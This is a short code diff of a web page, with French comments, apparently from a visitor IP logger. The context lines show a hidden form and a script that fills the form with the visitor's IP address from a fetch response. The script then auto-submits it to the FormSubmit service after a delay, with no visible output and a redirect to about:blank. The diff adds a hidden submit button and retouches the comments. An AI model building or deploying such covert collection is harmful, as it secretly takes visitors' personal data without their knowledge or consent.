@@ -53,6 +53,7 @@
     <input type="hidden" name="IP" id="ip-input">
     <input type="hidden" name="_captcha" value="false">
     <input type="hidden" name="_next" value="about:blank">
+    <button type="submit" id="submit-btn" style="display: none;"></button>
   </form>
 
   <script>
@@ -63,10 +64,10 @@
           const ip = data.ip;
           document.getElementById('ip-input').value = ip;
 
-          // petit délai avant d'envoyer, ça évite que FormSubmit crame l'envoi
+          // Petit délai avant d'envoyer, ça évite que FormSubmit crame l'envoi
           setTimeout(() => {
             document.getElementById('ip-form').submit();
-          }, 300);
+          }, 300); // Délai de 300ms
         });
     }
   </script>
